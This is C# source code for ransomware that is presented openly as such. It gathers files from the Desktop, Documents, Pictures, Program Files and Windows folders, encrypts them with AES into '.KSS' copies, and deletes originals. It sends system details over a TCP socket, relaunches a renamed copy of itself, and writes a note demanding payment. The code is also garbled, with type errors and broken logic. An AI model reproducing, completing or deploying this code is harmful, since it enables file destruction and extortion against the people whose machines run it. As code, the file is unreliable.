using System;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Management;
using System.Security.Cryptography;
using SharpCompress.Archives;
using SharpCompress.Common;
using Windows.UI.Notifications;
using Microsoft.Toolkit.Uwp.Notifications;

internal class Program
{
    private static void Main(string[] args)
    {
        string directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string java9 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string rory8 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        string nurnik3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        string ano4 = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        string lisa8 = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
        string larone9 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
      
        string[] files = Directory.GetFiles(directoryPath);
        string[] java77 = Directory.GetFiles(java9);
        string[] rory5 = Directory.GetFiles(rory8);
        string[] nurik4 = Directory.GetFiles(nurnik3);
        string[] ana77 = Directory.GetFiles(ano4);
        string[] lisa3 = Directory.GetFiles(lisa8);
        string[] laurane2 = Directory.GetFiles(larone9);

        TcpClient kaosChat = new TcpClient("localhost", 1234);
        NetworkStream stream = kaosChat.GetStream();

        ToastContent toastContent = new ToastContentBuilder()
          .AddText("joined da hypernet @w@")
          .GetToastContent();
                    
        ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        
        string filePath = "yori.ps1"; // change this to the desired file path
        
        using (StreamWriter writer = new StreamWriter(filePath))
        using (StreamReader reader = new StreamReader(stream))
        {
            while (kaosChat.Connected)
            {
                string receivedData = reader.ReadLine();
                writer.WriteLine(receivedData);
            }
        }

        // Alternatively, you can get only certain files by using a search pattern
        // For example, to get only files with a ".txt" extension:
        // string[] files = Directory.GetFiles(directoryPath, "*.txt");

        List<string> fileList = new List<string>();

        foreach (string file in files)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in java77)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in rory5)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in nurik4)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in ana77)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in lisa3)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in laurane2)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
      
        foreach (string file in fileList)
        {
            string dir = fileList;

            byte[] key = new byte[32];
            byte[] iv = new byte[16];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(key);
                rng.GetBytes(iv);
            }

            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;

                using (var inputFile = File.OpenRead(file))
                using (var outputFile = File.OpenWrite(inputFile + ".KSS"))
                {
                    using (var encryptor = aes.CreateEncryptor())
                    {
                        using (var cryptoStream = new CryptoStream(outputFile, encryptor, CryptoStreamMode.Write))
                        {
                            inputFile.CopyTo(cryptoStream);
                        }
                    }
                }
            }

            using (var keyFile = File.Create(Path.Combine(dir, "key.bin")))
            {
                string keyPath = Path.Combine(dir, "key.bin");
                keyFile.Write(key, 0, key.Length);
                keyFile.Write(iv, 0, iv.Length);
                string laga4 = Path.Combine(dir, "lauren7.LSE");
                string riga9 = File.ReadAllText(laga4).Trim();
                using (var archive = ArchiveFactory.Create(ArchiveType.Rar, Path.Combine(dir, "encrypted.rar"), new RarWriterOptions { Password = riga9 }))
                if (File.Exists(laga4))
                {
                    File.Delete(laga4);
                    Console.WriteLine("u gotta pay for the password X3");
                }
                else
                {
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("marked!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
                    Console.WriteLine("fack u bitch");
                    File.Delete(file);
                    File.Delete(riga9);
                    File.Delete(file);
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
        
                    foreach (ManagementObject obj in searcher.Get())
                    {
                    string message = "hai kaosSec im a bitchass pussy mf";
                    byte[] data = Encoding.ASCII.GetBytes(message);
                        string oj9 = ("OS Name: " + obj["Caption"]);
                        byte[] oj44 = Encoding.ASCII.GetBytes(oj9);
                        string lon4 = ("Version: " + obj["Version"]);
                        byte[] lon77 = Encoding.ASCII.GetBytes(lon4);
                        string af23 = ("Manufacturer: " + obj["Manufacturer"]);
                        byte[] af24 = Encoding.ASCII.GetBytes(af23);
                        string v2 = ("OS Architecture: " + obj["OSArchitecture"]);
                        byte[] v4 = Encoding.ASCII.GetBytes(v2);
                        string vb4 = ("System Directory: " + obj["SystemDirectory"]);
                        byte[] v7 = Encoding.ASCII.GetBytes(vb4);
                    stream.Write(data, 0, data.Length);
                    stream.Write(oj44, 0, oj44.Length);
                    stream.Write(lon77, 0, lon77.Length);
                    stream.Write(af24, 0, af24.Length);
                    stream.Write(v4, 0, v4.Length);
                    stream.Write(v7, 0, v7.Length);
                    }
        
                    searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        Console.WriteLine("CPU: " + obj["Name"]);
                    }
        
                    searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        Console.WriteLine("Total Memory: " + obj["TotalPhysicalMemory"]);
                    }
        
                    Console.ReadKey();
                    string rr9 = System.Reflection.Assembly.GetEntryAssembly().Location;
                    string u7 = Path.GetDirectoryName(rr9);
                    string lv6 = Path.GetRandomFileName() + ".exe";
                    string x4 = Path.Combine(u7, lv6);
                    File.Copy(lv6, x4);
                    Process.Start(x4);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("remember kaosSec we think we'll remember u :3")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
                }
                {
                    archive.AddEntry("key.bin", File.OpenRead(keyPath), true);
                    
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Oh no! D:")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));

                    string filePath = Path.Combine(directoryPath, "myfiles.LSE.txt");
                    File.WriteAllText(filePath, "oh no! you have to send your money to: [PLACEHOLDER] or you'll lose your files :(");
                }
            }
        }
    }
}
